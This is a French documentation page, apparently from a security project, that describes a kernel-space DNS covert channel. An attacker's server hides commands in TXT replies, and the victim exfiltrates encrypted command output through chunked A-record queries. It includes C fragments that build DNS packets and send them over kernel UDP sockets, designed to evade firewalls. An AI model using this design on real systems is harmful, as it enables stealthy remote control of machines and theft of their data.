\page network Réseau
\tableofcontents

## 1. 🌐 Introduction

## 2. 🤝 TCP

## 3. 🧭 DNS

Dans le cadre de ce projet, la communication principale utilisée pour l’échange de paquets entre les deux machines virtuelles repose naturellement sur le protocole TCP. Cependant, nous avons choisi de mettre en œuvre une méthode de communication alternative afin d’introduire un aspect furtif aux échanges. L’objectif est de démontrer comment envoyer des commandes à une machine cible via des requêtes DNS de type **TXT**, puis d’exfiltrer les résultats de ces commandes en les encapsulant dans des requêtes DNS de type **A**. La partie **C** (côté victime) construit manuellement les paquets DNS, les envoie, puis lit les réponses. Du côté attaquant, un programme Python écoute sur le port **53**, intercepte les requêtes DNS entrantes et y répond en renvoyant les données attendues.

### 3.1 🧠 Principes

Nous supposons ici un scénario réel, où il n’est pas possible de mettre en place un serveur DNS côté victime, notamment en raison de restrictions réseau ou d’un éventuel blocage par un pare-feu. Par conséquent, la solution adoptée consiste à mettre en place un serveur DNS côté attaquant. Depuis l’espace noyau, la machine victime enverra des requêtes DNS de type TXT vers un domaine du type command.dns.google.com, afin de demander des informations textuelles. C’est dans la réponse à cette requête que l’attaquant peut insérer une commande, si une est disponible. Sinon, la réponse sera vide.

Pour permettre à la victime d’envoyer des résultats d’exécution ou d’autres informations en retour, celle-ci enverra des requêtes DNS de type A, où le nom de domaine contient les données chiffrées. Comme la taille maximale d’un nom de domaine est limitée, et que le domaine complet inclut un suffixe du type *.dns.google.com* ainsi que des identifiants de chunk comme *xx/xx-*, les données doivent être fragmentées en plusieurs morceaux. Par défaut :
- Le polling DNS de la victime s’effectue toutes les 5000 ms.
- Le nombre de chunks est limité à 128 (config.h), afin d’éviter des délais excessifs côté attaquant, tout en maintenant un niveau de furtivité raisonnable.

Une fois les données reçues, le serveur DNS (côté attaquant) peut simplement répondre avec une adresse IP arbitraire, par exemple **127.0.0.1**, puisque l’adresse **IP** n’a aucune importance dans ce contexte. Si je ne me suis pas trompé dans les calculs (ce qui a de grandes chances d’arriver), on peut envoyer depuis la victime vers l’attaquant 57 octets de données utiles par requête **A**, ce qui restreint évidemment le volume à transférer et augmente le nombre de chunks (en plus avec le chiffrement...). Pour l’envoi de commandes depuis l’attaquant, la limite est beaucoup plus élevée, soit environ 459 octets (dans le champ **RDATA** d’un enregistrement **TXT**).

### 3.2 📨 Requête

#### 3.2.1 Header
<img 
  src="dns_header.svg" 
  style="
    display: block;
    margin: 50px auto;
    overflow: hidden;
  "
/>

Dans le fichier dns.c, on trouve la définition (packing byte-à-byte) d’un header DNS. En byte order réseau (big-endian), on utilise la fonction `htons()` pour chaque champ 16 bits avant de le copier en mémoire. Le `#pragma pack(push, 1)` s’assure que la structure n’a pas d’alignement automatique, afin que le remplissage en octets soit exactement linéaire (12 octets).
```c
#pragma pack(push, 1)
struct dns_header_t {
    __be16 id;          // Identification (16 bits)
    __be16 flags;       // Flags + codes de réponse (16 bits)
    __be16 qdcount;     // Nombre de questions (16 bits)
    __be16 ancount;     // Nombre d’answers (réponses) (16 bits)
    __be16 nscount;     // Nombre d’autorités (authority RRs) (16 bits)
    __be16 arcount;     // Nombre de RRs additionnels (RRs) (16 bits)
};
#pragma pack(pop)
```

Par ailleurs, la fonction dns_send_query est l’élément central qui, dans dns.c, construit à la main un paquet DNS (en UDP) et l’envoie au résolveur. Son prototype est static int dns_send_query(const char *query_name, __be16 question_type, u8 *response_buffer, int *response_length). Après avoir alloué dynamiquement le buffer qui contiendra la requête dans son intégralité, on construit progressivement l’en-tête.
```c
struct dns_header_t *hdr = (void *) packet_buffer;
get_random_bytes(&hdr->id, sizeof(hdr->id));
hdr->flags = htons(0x0100);
hdr->qdcount = htons(1);
hdr->ancount = htons(0);
hdr->nscount = htons(0);
hdr->arcount = htons(0);
offset = DNS_HDR_SIZE;
```

#### 3.2.2 QNAME

Le champ **QNAME** représente le nom de domaine demandé. En DNS, il est encodé en *labels*. On parcourt donc après la construction du *header* la chaîne `query_name`. L'encodage est un peu particulier, car il faut précéder chaque partie entre les points par sa longueur en hexadécimal. Imaginons query_name = `01/04-abcdef.command.com`, on aura :
```c
[0D] 30 31 2F 30 34 2D 61 62 63 64 65 66    // "01/04-abcdef" (13 chars)
[07] 63 6F 6D 6D 61 6E 64                   // "command" (7 chars)
[03] 63 6F 6D                               // "com" (3 chars)
[00]                                        // Terminaison du QNAME
```

Concernant le **QTYPE**, deux possibilités existent selon l’appel de la fonction qui construit le paquet : soit 1 pour une requête de type **A** (adresse IPv4), soit 16 pour une requête de type **TXT** (texte). À ce stade, la section “Question” du paquet est complète : header (12 octets) + **QNAME** (labels + 0x00) + **QTYPE** (2 octets) + **QCLASS** (2 octets). **QCLASS** le type de réseau ou de protocole pour lequel la requête DNS est faite (1 pour internet ici). On a donc la requête DNS brute à envoyer.

#### 3.2.3 Socket
```c
// Create a UDP socket in kernel (need to hide it ?)
result = sock_create_kern(&init_net, AF_INET, SOCK_DGRAM, IPPROTO_UDP, &sock);
if (result < 0) {
  kfree(packet_buffer);
  return result;
}
  
// Prepare the destination address
memset(&dest_addr, 0, sizeof(dest_addr));
dest_addr.sin_family = AF_INET;
dest_addr.sin_port = htons(DNS_PORT);
in4_pton(ip, -1, (u8 *)&dest_addr.sin_addr.s_addr, -1, NULL);

// Tell kernel_sendmsg where to send
msg.msg_name = &dest_addr;
msg.msg_namelen = sizeof(dest_addr);

// Send the DNS query
iov.iov_base = packet_buffer;
iov.iov_len = offset;
result = kernel_sendmsg(sock, &msg, &iov, 1, offset);
if (result < 0) {
  sock_release(sock);
  kfree(packet_buffer);
  return result;
}
```

La création de la socket et l'envoi du message sont ensuite assez classiques :
- `sock_create_kern` crée une socket UDP depuis l’espace noyau.
- `dest_addr.sin_port = htons(DNS_PORT)` configure le port 53 (voir config.h).
- `in4_pton(ip, ...)` convertit l’adresse IP du serveur DNS en `sin_addr.s_addr`
- `kernel_sendmsg` envoie la requête DNS en une seule opération. *Bam !*

#### 3.2.4 Exfiltration

Toujours dans la même fonction, on commence par recevoir une réponse de manière non bloquante, que l’on enregistre dans les buffer pointés par les paramètres de la fonction.
```c
iov.iov_base = packet_buffer;
iov.iov_len = DNS_MAX_BUF;
result = kernel_recvmsg(sock, &msg, &iov, 1, DNS_MAX_BUF, MSG_DONTWAIT);
if (result > 0) {
  memcpy(response_buffer, packet_buffer, result);
  *response_length = result;
  result = 0;
}
else if (result == -EAGAIN || result == -EWOULDBLOCK) {
  *response_length = 0;
  result = 0;
}
```
## 4. 🔒 Chiffrement

## 5.  Améliorations

<img 
  src="logo_no_text.png" 
  style="
    display: block;
    margin: 100px auto;
    width: 30%;
    overflow: hidden;
  "
/>